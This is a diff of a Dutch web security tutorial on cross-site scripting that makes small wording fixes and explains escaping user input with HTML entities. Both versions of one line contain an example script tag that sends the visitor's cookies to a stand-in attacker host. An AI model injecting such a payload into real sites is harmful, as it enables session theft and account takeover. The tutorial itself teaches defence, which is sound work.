@@ -61,15 +61,15 @@ figcaption {
 
       <p>Gevaarlijker is als het mogelijk is Javascript toe te voegen. Vaak doe je dit door een simpele &lt;script&gt; tag toe te voegen aan de HTML waar je je Javascript in zet. Met Javascript is het mogelijk om cookies en localstorage van de gebruiker te stelen. Stel bijvoorbeeld eens dat we onderstaande HTML toevoegen aan een pagina:</p>
 
-      <p><code>&lt;script&gt;document.location.href='http://evilsite.com/?cookie='+document.cookie;&lt;/script&gt;</code></p>
+      <p><code>&lt;script&gt;document.location.href='http://evilsite.com/logcookie.php?cookie='+document.cookie;&lt;/script&gt;</code></p>
 
-      <p>Zodra de gebruiker de pagina laad wordt bovenstaande Javascript uitgevoerd. De browser gaat dan automatisch naar de site van de aanvaller. Met de informatie uit zijn cookie. En omdat in de cookie vaak een sessiontoken staat kan de aanvaller deze cookie gebruiken om de gebruiker na te doen en zijn account over te nemen.</p>
+      <p>Zodra de gebruiker de pagina laad wordt bovenstaande Javascript uitgevoerd. De browser gaat dan automatisch naar de site van de aanvaller. Met de informatie uit de cookie van de gebruiker. En omdat in de cookie vaak een sessiontoken staat kan de aanvaller deze cookie gebruiken om de gebruiker na te doen en zijn account over te nemen.</p>
 
       <h3>Countermeasures</h3>
 
       <p>De belangrijkste regel bij websecurity is: <b>vertrouw nooit input van gebruikers</b>. Ga er van uit dat ze alle mogelijke invoer hebben gevuld met zoveel mogelijk rare tekens in de hoop dat ze iets voorbij jouw filters krijgen. De oplossing voor dit probleem is dan ook om alle invoer die je weer weergeeft op de pagina te <b>escapen</b>.</p>
 
-      <p>In HTML kan je dat doen door alle speciale tekens te vervangen door hun HTML entities. <code>&quot;</code> wordt dan bijvoorbeeld <code>&amp;quot;</code> en <code>&lt;</code> door <code>&amp;lt;</code>, deze entities worden altijd letterlijk weergegeven door de browser en worden nooit als nieuwe tags en attributen gezien.</p>
+      <p>In HTML kan je dat doen door alle speciale tekens te vervangen door hun HTML entities. <code>&quot;</code> wordt dan bijvoorbeeld <code>&amp;quot;</code> en <code>&lt;</code> wordt <code>&amp;lt;</code>. Deze entities worden altijd letterlijk weergegeven door de browser en worden nooit als nieuwe tags en attributen gezien.</p>
 
       <p>Let op dat het uitmaakt waar in de HTML je de invoer van de gebruiker plaatst. Stel dat je de site zo geprogrammeerd hebt:</p>
 
